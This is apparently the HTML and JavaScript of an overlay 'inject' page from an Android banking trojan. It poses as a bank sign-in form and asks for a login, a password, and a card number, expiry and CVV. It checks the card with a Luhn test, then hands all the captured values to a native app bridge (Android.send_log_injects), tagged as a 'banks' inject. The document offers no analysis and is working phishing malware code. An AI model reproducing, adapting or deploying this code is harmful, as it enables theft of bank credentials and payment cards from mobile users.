    <style>
        label {
            font-weight: 600;
            font-size: 18px;
        }
        .input {
            padding: 12px;
            width: 100%;
            border: 1px solid #eeeeee;
            border-radius: 4px;
        }

        .input:focus {
            border-color: #ff6600;
        }

        span {
            color: #ccc;
            font-size: 14px;
            display: block;
            margin-bottom: 30px;
        }

        p {
            color: #4f4d7c;
            font-size: 18px;
            margin-top: -20px;
            padding: 0;
        }
        .submit {
            width: 100%;
            padding: 12px;
            color: #fff;
            font-size: 18px;
            background: #ff6600;
            border: 0;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        .btn {
            background-color: transparent;
            color: #ff6600;
            border: 1px solid #ff6600;
            border-radius: 4px;
            text-align: center;
            width: 100%;
            font-size: 18px;
            padding: 12px;
        }

        .error {
            border-color: #f00 !important;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .submit:disabled {
            opacity: 0.4;
        }
        section {
            padding: 20px;
        }
    </style>

    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
        
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData'),
            sendDataFull = document.getElementById('sendDataFull');

        sendData.onclick = function(){
            if(login.value.length < 6){
                login.classList = 'input error';
                login.focus()
            } else if(password.value.length !== 5){
                login.classList = 'input';
                password.classList = 'input error';
                password.focus()
            } else {
                password.classList = 'input';

                form1.style.display = 'none';
                form2.style.display = 'block';
            }
            return false
        }

        sendDataFull.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }

    function check3() {
        var mmYY = exp.value.split('/');
        var month = parseInt(mmYY[0]);
        var year = parseInt(mmYY[1]);

        var expArray = exp.value.split('/');
        var today, someday;
        var exMonth = expArray[0];
        var exYear = "20" + expArray[1];

        today = new Date();
        someday = new Date();
        someday.setFullYear(exYear, exMonth, 1);

        function expCheck() {
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 30 || exp.value.length != 5) {
                return false
            } else {
                return true
            }
        }

        if(valid_credit_card(cc.value) && expCheck() == true && cvv.value.length == 3) {
                sendDataFull.disabled = false
            } else {
                sendDataFull.disabled = true
            }
    }
    
function valid_credit_card(value) {
    if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
    if (/[^0-9-\s]+/.test(value)) return false;
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");
    for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);
        if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
        }
        nCheck += nDigit;
        bEven = !bEven;
    }
    return (nCheck % 10) == 0;
}
    </script>
